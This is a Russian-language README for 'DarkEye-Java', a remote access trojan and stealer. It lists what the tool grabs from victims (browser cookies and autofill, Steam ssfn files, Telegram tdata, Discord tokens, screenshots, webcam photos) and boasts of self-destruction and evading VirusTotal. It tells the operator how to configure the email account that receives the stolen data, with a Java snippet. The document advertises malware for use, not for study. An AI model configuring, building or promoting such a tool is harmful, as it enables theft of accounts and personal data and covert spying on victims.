# DarkEye-Java
Rat/Stealer

## Функции
Отправка файлов происходит через почту (.zip)

- [Yandex, Chrome, Opera] Cookie, Auto-Fill, leveldb grabber
- Steam: config, ssfn grabber
- Telegram: tdata
- Discord: Cookie, leveldb
- Скрин экрана
- Фото с вебкамеры (имейте в виду что загарается лампа)
- Самоуничтожение
- VirusTotal undetected

## Конфиг
В классе Config нужно вписать свои данные почты Отправителя и Получателя.
В отправителя нужно выбрать какая почта (EMailMethod)
```Java
public static EMailData FROM_DATA = new EMailData("xxxxx@yandex.ru", "password", EMailMethod.YANDEX);
public static EMailData TO_DATA = new EMailData("xxxxx@gmail.com");
```

#### Настройка email
##### Обьязательно*
В настройках почты отправителя включите:
Разрешить доступ к почтовому ящику с помощью почтовых клиентов IMAP

[C# DarkEye](https://github.com/GishReloaded/DarkEye)